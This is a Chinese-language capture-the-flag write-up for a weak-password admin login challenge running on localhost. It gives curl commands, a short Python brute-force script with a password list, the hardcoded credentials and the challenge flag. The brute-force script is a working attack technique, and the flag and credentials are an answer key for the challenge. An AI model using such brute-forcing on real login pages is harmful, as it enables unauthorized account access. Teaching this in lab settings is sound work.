# 21 · 管理后台登录 — Writeup

## 思路

后台没有验证码，也没有失败锁定。页面源码注释里提示了管理员用户名 `admin`，密码是弱口令。

先看页面源码：

```bash
curl -s http://127.0.0.1:8128/ | grep -n 'admin\|密码'
```

然后用常见弱口令字典爆破。本题的密码是 `admin888`：

```bash
curl -s -c /tmp/c3.cookie \
  -d 'username=admin&password=admin888' \
  http://127.0.0.1:8128/login | grep -o 'flag{[^}]*}'
```

`-c` 保存 session cookie；登录成功后访问首页也能看到 flag。

## 爆破脚本

```python
import re
import requests

url = "http://127.0.0.1:8128/login"
passwords = ["123456", "admin", "admin123", "admin888", "password", "qwerty"]

for password in passwords:
    r = requests.post(url, data={"username": "admin", "password": password})
    if 'data-result="success"' in r.text:
        print(password, re.search(r"flag\{[^}]+\}", r.text).group(0))
        break
```

真实比赛里用 Burp Intruder 或更大的字典即可。`src/app/app.py` 里用户名和密码是硬编码的 `admin` / `admin888`，登录状态存在 Flask session 里。

## Flag

`flag{97f654fd031b142c4c6e56fbc4b49fe2}`（本地复现 flag；平台实例的 flag 由 `FLAG` 环境变量注入）
